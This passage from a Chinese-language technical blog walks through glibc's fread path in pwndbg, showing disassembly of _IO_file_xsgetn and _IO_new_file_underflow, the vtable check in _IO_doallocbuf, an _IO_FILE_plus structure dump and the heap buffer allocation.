 0x00007ffff7c8b496 &lt;+486&gt;:   or     ecx,0x20</span><br><span class="line">   0x00007ffff7c8b499 &lt;+489&gt;:   test   rax,rax</span><br><span class="line">   0x00007ffff7c8b49c &lt;+492&gt;:   cmovne edx,ecx</span><br><span class="line">   0x00007ffff7c8b49f &lt;+495&gt;:   mov    DWORD PTR [rbx],edx</span><br><span class="line">   0x00007ffff7c8b4a1 &lt;+497&gt;:   jmp    0x7ffff7c8b448 &lt;__GI__IO_file_xsgetn+408&gt;</span><br><span class="line">   0x00007ffff7c8b4a3 &lt;+499&gt;:   nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8b4a8 &lt;+504&gt;:   mov    rdi,QWORD PTR [rdi+0x48]</span><br><span class="line">   0x00007ffff7c8b4ac &lt;+508&gt;:   test   rdi,rdi</span><br><span class="line">   0x00007ffff7c8b4af &lt;+511&gt;:   je     0x7ffff7c8b4bc &lt;__GI__IO_file_xsgetn+524&gt;</span><br><span class="line">   0x00007ffff7c8b4b1 &lt;+513&gt;:   call   0x7ffff7c28370 &lt;free@plt&gt;</span><br><span class="line">   0x00007ffff7c8b4b6 &lt;+518&gt;:   and    DWORD PTR [rbx],0xfffffeff</span><br><span class="line">   0x00007ffff7c8b4bc &lt;+524&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8b4bf &lt;+527&gt;:   call   0x7ffff7c8dc90 &lt;__GI__IO_doallocbuf&gt;</span><br><span class="line">   0x00007ffff7c8b4c4 &lt;+532&gt;:   jmp    0x7ffff7c8b2d7 &lt;__GI__IO_file_xsgetn+39&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p><strong><code>_IO_file_xsgetn</code>函数是fread的核心，其大致流程整体是一个循环，先检查读缓冲区状态（<code>fp-&gt;_IO_read_end</code> - <code>fp-&gt;_IO_read_ptr</code>），大于0则从<code>fp-&gt;_IO_read_ptr</code>读取数据到目标，并更新读指针，如果读缓冲区为空则会调用<code>__underflow</code>函数再读取（第一次读写前<code>_IO_file_xsgetn</code>会先调用<code>_IO_doallocbuf</code>分配缓冲区）</strong><br>回到调试，<code>_IO_file_xsgetn</code>先保存寄存器和读取字节数，这一部分就懒得放了（上面代码可以看到）,然后检查 <code>_IO_buf_base</code> (<code>[rdi + 0x38]</code>处)是否为0，为0则说明无缓冲区，调用<code>_IO_doallocbuf</code>分配缓冲区<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8b2c4 &lt;__GI__IO_file_xsgetn+20&gt;     sub    rsp, 0x18                     RSP =&gt; 0x7fffffffdc50 (0x7fffffffdc68 - 0x18)</span><br><span class="line">0x7ffff7c8b2c8 &lt;__GI__IO_file_xsgetn+24&gt;     cmp    qword ptr [rdi + 0x38], 0     0 - 0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8b2cd &lt;__GI__IO_file_xsgetn+29&gt;     mov    qword ptr [rsp], rdx          [0x7fffffffdc50] &lt;= 0x14</span><br><span class="line">0x7ffff7c8b2d1 &lt;__GI__IO_file_xsgetn+33&gt;   ✔ je     __GI__IO_file_xsgetn+504    &lt;__GI__IO_file_xsgetn+504&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8b4a8 &lt;__GI__IO_file_xsgetn+504&gt;    mov    rdi, qword ptr [rdi + 0x48]     RDI, [0x5555555592e8] =&gt; 0</span><br><span class="line">0x7ffff7c8b4ac &lt;__GI__IO_file_xsgetn+508&gt;    test   rdi, rdi                        0 &amp; 0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8b4af &lt;__GI__IO_file_xsgetn+511&gt;  ✔ je     __GI__IO_file_xsgetn+524    &lt;__GI__IO_file_xsgetn+524&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8b4bc &lt;__GI__IO_file_xsgetn+524&gt;    mov    rdi, rbx                        RDI =&gt; 0x5555555592a0 ◂— 0xfbad2484</span><br><span class="line">0x7ffff7c8b4bf &lt;__GI__IO_file_xsgetn+527&gt;    call   _IO_doallocbuf              &lt;_IO_doallocbuf&gt;</span><br></pre></td></tr></table></figure><p><code>_IO_doallocbuf</code>函数还会调用<code>vtable-&gt;_IO_file_doallocate</code>函数（会进行安全检测），最终实现分配 <code>_IO_buf_base</code> ~ <code>_IO_buf_end</code> 之间的缓冲区（调用<code>malloc</code>分配堆上内存）<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8dcb7 &lt;_IO_doallocbuf+39&gt;    mov    rbp, qword ptr [rbx + 0xd8]     RBP, [0x555555559378] =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8dcbe &lt;_IO_doallocbuf+46&gt;    lea    rdx, [rip + 0x188d3b]           RDX =&gt; 0x7ffff7e16a00 (_IO_helper_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8dcc5 &lt;_IO_doallocbuf+53&gt;    lea    rax, [rip + 0x189a9c]           RAX =&gt; 0x7ffff7e17768 ◂— 0</span><br><span class="line">0x7ffff7c8dccc &lt;_IO_doallocbuf+60&gt;    sub    rax, rdx                        RAX =&gt; 0xd68 (0x7ffff7e17768 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c8dccf &lt;_IO_doallocbuf+63&gt;    mov    rcx, rbp                        RCX =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8dcd2 &lt;_IO_doallocbuf+66&gt;    sub    rcx, rdx                        RCX =&gt; 0xc00 (0x7ffff7e17600 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c8dcd5 &lt;_IO_doallocbuf+69&gt;    cmp    rax, rcx                        0xd68 - 0xc00     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c8dcd8 &lt;_IO_doallocbuf+72&gt;:    jbe    0x7ffff7c8dd40 &lt;__GI__IO_doallocbuf+176&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8dd40 &lt;_IO_doallocbuf+176&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br></pre></td></tr></table></figure><p>安全检查如上<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8dcda &lt;_IO_doallocbuf+74&gt;     mov    rdi, rbx     RDI =&gt; 0x5555555592a0 ◂— 0xfbad2484</span><br><span class="line">0x7ffff7c8dcdd &lt;_IO_doallocbuf+77&gt;     call   qword ptr [rbp + 0x68]      &lt;_IO_file_doallocate&gt;</span><br></pre></td></tr></table></figure><p>具体代码就不放了，其还会调用<code>_IO_file_stat</code>函数再调用<code>fstat64</code>函数来保存文件状态，然后调用<code>_IO_setb</code>函数来设置<code>fp-&gt;_IO_buf_base</code> &#x3D; buf，<code>fp-&gt;_IO_buf_end</code> &#x3D; ebuf，并设置 <code>_IO_save_base</code>, <code>_IO_backup_base</code> ,<code>fp-&gt;_IO_save_end</code>指针为0<br>我们看最后<code>_IO_doallocbuf</code>结束后结构体的状态<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$5 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539004,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_buf_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>_IO_buf_base</code>以及<code>_IO_buf_end</code>已经被正确设置了<br>我们再查看堆，发现确实分配了0x1000大小的缓冲区<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x1e0 (with flag bits: 0x1e1)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559470</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555594a0</span><br><span class="line">Size: 0x1010 (with flag bits: 0x1011)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555a4b0</span><br><span class="line">Size: 0x1fb50 (with flag bits: 0x1fb51)</span><br></pre></td></tr></table></figure><p>之后<code>_IO_file_xsgetn</code>检查读缓冲区，发现<code>fp-&gt;_IO_read_ptr</code>&#x3D;&#x3D; <code>fp-&gt;_IO_read_end</code>，读缓冲区为空，则调用<code>__underflow</code>函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8b430 &lt;__GI__IO_file_xsgetn+384&gt;    mov    rdi, rbx     RDI =&gt; 0x5555555592a0 ◂— 0xfbad2484</span><br><span class="line">0x7ffff7c8b433 &lt;__GI__IO_file_xsgetn+387&gt;    call   __underflow                 &lt;__underflow&gt;</span><br></pre></td></tr></table></figure><p>而<code>__underflow</code>函数正是调用了<code>vtable-&gt;_IO_file_underflow</code>函数（<code>[_IO_file_jumps+32]</code>便是）<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8d8f1 &lt;__underflow+129&gt;          mov    rax, qword ptr [rbx + 0x20]     RAX, [_IO_file_jumps+32] =&gt; 0x7ffff7c8cab0 (_IO_file_underflow) ◂— endbr64</span><br><span class="line">0x7ffff7c8d8f5 &lt;__underflow+133&gt;          add    rsp, 8                          RSP =&gt; 0x7fffffffdc38 (0x7fffffffdc30 + 0x8)</span><br><span class="line">0x7ffff7c8d8f9 &lt;__underflow+137&gt;          mov    rdi, rbp                        RDI =&gt; 0x5555555592a0 ◂— 0xfbad2484</span><br><span class="line">0x7ffff7c8d8fc &lt;__underflow+140&gt;          pop    rbx                             RBX =&gt; 0x5555555592a0</span><br><span class="line">0x7ffff7c8d8fd &lt;__underflow+141&gt;          pop    rbp                             RBP =&gt; 0</span><br><span class="line">0x7ffff7c8d8fe &lt;__underflow+142&gt;          jmp    rax                         &lt;_IO_file_underflow&gt;</span><br></pre></td></tr></table></figure><p>放上<code>vtable-&gt;_IO_file_underflow</code>的汇编<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass</span><br><span class="line">Dump of assembler code for function _IO_new_file_underflow:</span><br><span class="line">Address range 0x7ffff7c8cab0 to 0x7ffff7c8cdb9:</span><br><span class="line">=&gt; 0x00007ffff7c8cab0 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x00007ffff7c8cab4 &lt;+4&gt;:     mov    eax,DWORD PTR [rdi]</span><br><span class="line">   0x00007ffff7c8cab6 &lt;+6&gt;:     test   al,0x10</span><br><span class="line">   0x00007ffff7c8cab8 &lt;+8&gt;:     jne    0x7ffff7c8cd88 &lt;_IO_new_file_underflow+728&gt;</span><br><span class="line">   0x00007ffff7c8cabe &lt;+14&gt;:    push   r15</span><br><span class="line">   0x00007ffff7c8cac0 &lt;+16&gt;:    push   r14</span><br><span class="line">   0x00007ffff7c8cac2 &lt;+18&gt;:    push   r13</span><br><span class="line">   0x00007ffff7c8cac4 &lt;+20&gt;:    push   r12</span><br><span class="line">   0x00007ffff7c8cac6 &lt;+22&gt;:    push   rbp</span><br><span class="line">   0x00007ffff7c8cac7 &lt;+23&gt;:    push   rbx</span><br><span class="line">   0x00007ffff7c8cac8 &lt;+24&gt;:    mov    rbx,rdi</span><br><span class="line">   0x00007ffff7c8cacb &lt;+27&gt;:    sub    rsp,0x18</span><br><span class="line">   0x00007ffff7c8cacf &lt;+31&gt;:    test   al,0x4</span><br><span class="line">   0x00007ffff7c8cad1 &lt;+33&gt;:    jne    0x7ffff7c8cd90 &lt;_IO_new_file_underflow+736&gt;</span><br><span class="line">   0x00007ffff7c8cad7 &lt;+39&gt;:    mov    rdx,QWORD PTR [rdi+0x8]</span><br><span class="line">   0x00007ffff7c8cadb &lt;+43&gt;:    cmp    rdx,QWORD PTR [rdi+0x10]</span><br><span class="line">   0x00007ffff7c8cadf &lt;+47&gt;:    jb     0x7ffff7c8cc70 &lt;_IO_new_file_underflow+448&gt;</span><br><span class="line">   0x00007ffff7c8cae5 &lt;+53&gt;:    cmp    QWORD PTR [rdi+0x38],0x0</span><br><span class="line">   0x00007ffff7c8caea &lt;+58&gt;:    je     0x7ffff7c8ccc0 &lt;_IO_new_file_underflow+528&gt;</span><br><span class="line">   0x00007ffff7c8caf0 &lt;+64&gt;:    test   eax,0x202</span><br><span class="line">   0x00007ffff7c8caf5 &lt;+69&gt;:    je     0x7ffff7c8cbd2 &lt;_IO_new_file_underflow+290&gt;</span><br><span class="line">   0x00007ffff7c8cafb &lt;+75&gt;:    mov    rax,QWORD PTR [rip+0x18d336]        # 0x7ffff7e19e38</span><br><span class="line">   0x00007ffff7c8cb02 &lt;+82&gt;:    mov    r12,QWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c8cb05 &lt;+85&gt;:    mov    edx,DWORD PTR [r12]</span><br><span class="line">   0x00007ffff7c8cb09 &lt;+89&gt;:    mov    eax,edx</span><br><span class="line">   0x00007ffff7c8cb0b &lt;+91&gt;:    and    eax,0x8000</span><br><span class="line">   0x00007ffff7c8cb10 &lt;+96&gt;:    jne    0x7ffff7c8cbc0 &lt;_IO_new_file_underflow+272&gt;</span><br><span class="line">   0x00007ffff7c8cb16 &lt;+102&gt;:   mov    rdi,QWORD PTR [r12+0x88]</span><br><span class="line">   0x00007ffff7c8cb1e &lt;+110&gt;:   mov    rbp,QWORD PTR fs:0x10</span><br><span class="line">   0x00007ffff7c8cb27 &lt;+119&gt;:   cmp    QWORD PTR [rdi+0x8],rbp</span><br><span class="line">   0x00007ffff7c8cb2b &lt;+123&gt;:   je     0x7ffff7c8ccf0 &lt;_IO_new_file_underflow+576&gt;</span><br><span class="line">   0x00007ffff7c8cb31 &lt;+129&gt;:   mov    edx,0x1</span><br><span class="line">   0x00007ffff7c8cb36 &lt;+134&gt;:   lock cmpxchg DWORD PTR [rdi],edx</span><br><span class="line">   0x00007ffff7c8cb3a &lt;+138&gt;:   jne    0x7ffff7c8cd78 &lt;_IO_new_file_underflow+712&gt;</span><br><span class="line">   0x00007ffff7c8cb40 &lt;+144&gt;:   mov    rax,QWORD PTR [rip+0x18d2f1]        # 0x7ffff7e19e38</span><br><span class="line">   0x00007ffff7c8cb47 &lt;+151&gt;:   mov    rdi,QWORD PTR [r12+0x88]</span><br><span class="line">   0x00007ffff7c8cb4f &lt;+159&gt;:   mov    r8,QWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c8cb52 &lt;+162&gt;:   mov    QWORD PTR [rdi+0x8],rbp</span><br><span class="line">   0x00007ffff7c8cb56 &lt;+166&gt;:   mov    edx,DWORD PTR [r8]</span><br><span class="line">   0x00007ffff7c8cb59 &lt;+169&gt;:   and    edx,0x288</span><br><span class="line">   0x00007ffff7c8cb5f &lt;+175&gt;:   add    DWORD PTR [rdi+0x4],0x1</span><br><span class="line">   0x00007ffff7c8cb63 &lt;+179&gt;:   cmp    edx,0x280</span><br><span class="line">   0x00007ffff7c8cb69 &lt;+185&gt;:   je     0x7ffff7c8cd03 &lt;_IO_new_file_underflow+595&gt;</span><br><span class="line">   0x00007ffff7c8cb6f &lt;+191&gt;:   lea    r15,[rip+0x18abf2]        # 0x7ffff7e17768</span><br><span class="line">   0x00007ffff7c8cb76 &lt;+198&gt;:   lea    rbp,[rip+0x189e83]        # 0x7ffff7e16a00 &lt;_IO_helper_jumps&gt;</span><br><span class="line">   0x00007ffff7c8cb7d &lt;+205&gt;:   mov    r13,r15</span><br><span class="line">   0x00007ffff7c8cb80 &lt;+208&gt;:   mov    r14,rbp</span><br><span class="line">   0x00007ffff7c8cb83 &lt;+211&gt;:   sub    r13,rbp</span><br><span class="line">   0x00007ffff7c8cb86 &lt;+214&gt;:   test   DWORD PTR [r12],0x8000</span><br><span class="line">   0x00007ffff7c8cb8e &lt;+222&gt;:   jne    0x7ffff7c8cbe0 &lt;_IO_new_file_underflow+304&gt;</span><br><span class="line">   0x00007ffff7c8cb90 &lt;+224&gt;:   mov    rdi,QWORD PTR [r12+0x88]</span><br><span class="line">   0x00007ffff7c8cb98 &lt;+232&gt;:   mov    eax,DWORD PTR [rdi+0x4]</span><br><span class="line">   0x00007ffff7c8cb9b &lt;+235&gt;:   sub    eax,0x1</span><br><span class="line">   0x00007ffff7c8cb9e &lt;+238&gt;:   mov    DWORD PTR [rdi+0x4],eax</span><br><span class="line">   0x00007ffff7c8cba1 &lt;+241&gt;:   jne    0x7ffff7c8cbe0 &lt;_IO_new_file_underflow+304&gt;</span><br><span class="line">   0x00007ffff7c8cba3 &lt;+243&gt;:   mov    QWORD PTR [rdi+0x8],0x0</span><br><span class="line">   0x00007ffff7c8cbab &lt;+251&gt;:   xchg   DWORD PTR [rdi],eax</span><br><span class="line">   0x00007ffff7c8cbad &lt;+253&gt;:   cmp    eax,0x1</span><br><span class="line">   0x00007ffff7c8cbb0 &lt;+256&gt;:   jle    0x7ffff7c8cbe0 &lt;_IO_new_file_underflow+304&gt;</span><br><span class="line">   0x00007ffff7c8cbb2 &lt;+258&gt;:   call   0x7ffff7c91300 &lt;__GI___lll_lock_wake_private&gt;</span><br><span class="line">   0x00007ffff7c8cbb7 &lt;+263&gt;:   jmp    0x7ffff7c8cbed &lt;_IO_new_file_underflow+317&gt;</span><br><span class="line">   0x00007ffff7c8cbb9 &lt;+265&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8cbc0 &lt;+272&gt;:   and    edx,0x288</span><br><span class="line">   0x00007ffff7c8cbc6 &lt;+278&gt;:   cmp    edx,0x280</span><br><span class="line">   0x00007ffff7c8cbcc &lt;+284&gt;:   je     0x7ffff7c8cd00 &lt;_IO_new_file_underflow+592&gt;</span><br><span class="line">   0x00007ffff7c8cbd2 &lt;+290&gt;:   lea    r15,[rip+0x18ab8f]        # 0x7ffff7e17768</span><br><span class="line">   0x00007ffff7c8cbd9 &lt;+297&gt;:   lea    rbp,[rip+0x189e20]        # 0x7ffff7e16a00 &lt;_IO_helper_jumps&gt;</span><br><span class="line">   0x00007ffff7c8cbe0 &lt;+304&gt;:   sub    r15,rbp</span><br><span class="line">   0x00007ffff7c8cbe3 &lt;+307&gt;:   lea    r14,[rip+0x189e16]        # 0x7ffff7e16a00 &lt;_IO_helper_jumps&gt;</span><br><span class="line">   0x00007ffff7c8cbea &lt;+314&gt;:   mov    r13,r15</span><br><span class="line">   0x00007ffff7c8cbed &lt;+317&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8cbf0 &lt;+320&gt;:   call   0x7ffff7c8d720 &lt;__GI__IO_switch_to_get_mode&gt;</span><br><span class="line">   0x00007ffff7c8cbf5 &lt;+325&gt;:   movdqu xmm0,XMMWORD PTR [rbx+0x38]</span><br><span class="line">   0x00007ffff7c8cbfa &lt;+330&gt;:   mov    rbp,QWORD PTR [rbx+0xd8]</span><br><span class="line">   0x00007ffff7c8cc01 &lt;+337&gt;:   movdqa xmm1,xmm0</span><br><span class="line">   0x00007ffff7c8cc05 &lt;+341&gt;:   mov    rax,rbp</span><br><span class="line">   0x00007ffff7c8cc08 &lt;+344&gt;:   movq   rsi,xmm0</span><br><span class="line">   0x00007ffff7c8cc0d &lt;+349&gt;:   punpcklqdq xmm1,xmm0</span><br><span class="line">   0x00007ffff7c8cc11 &lt;+353&gt;:   sub    rax,r14</span><br><span class="line">   0x00007ffff7c8cc14 &lt;+356&gt;:   movups XMMWORD PTR [rbx+0x8],xmm1</span><br><span class="line">   0x00007ffff7c8cc18 &lt;+360&gt;:   movups XMMWORD PTR [rbx+0x18],xmm1</span><br><span class="line">   0x00007ffff7c8cc1c &lt;+364&gt;:   movups XMMWORD PTR [rbx+0x28],xmm1</span><br><span class="line">   0x00007ffff7c8cc20 &lt;+368&gt;:   cmp    rax,r13</span><br><span class="line">   0x00007ffff7c8cc23 &lt;+371&gt;:   jae    0x7ffff7c8cd48 &lt;_IO_new_file_underflow+664&gt;</span><br><span class="line">   0x00007ffff7c8cc29 &lt;+377&gt;:   mov    rdx,QWORD PTR [rbx+0x40]</span><br><span class="line">   0x00007ffff7c8cc2d &lt;+381&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8cc30 &lt;+384&gt;:   sub    rdx,rsi</span><br><span class="line">   0x00007ffff7c8cc33 &lt;+387&gt;:   call   QWORD PTR [rbp+0x70]</span><br><span class="line">   0x00007ffff7c8cc36 &lt;+390&gt;:   test   rax,rax</span><br><span class="line">   0x00007ffff7c8cc39 &lt;+393&gt;:   jle    0x7ffff7c8cc88 &lt;_IO_new_file_underflow+472&gt;</span><br><span class="line">   0x00007ffff7c8cc3b &lt;+395&gt;:   mov    rdx,QWORD PTR [rbx+0x90]</span><br><span class="line">   0x00007ffff7c8cc42 &lt;+402&gt;:   add    QWORD PTR [rbx+0x10],rax</span><br><span class="line">   0x00007ffff7c8cc46 &lt;+406&gt;:   cmp    rdx,0xffffffffffffffff</span><br><span class="line">   0x00007ffff7c8cc4a 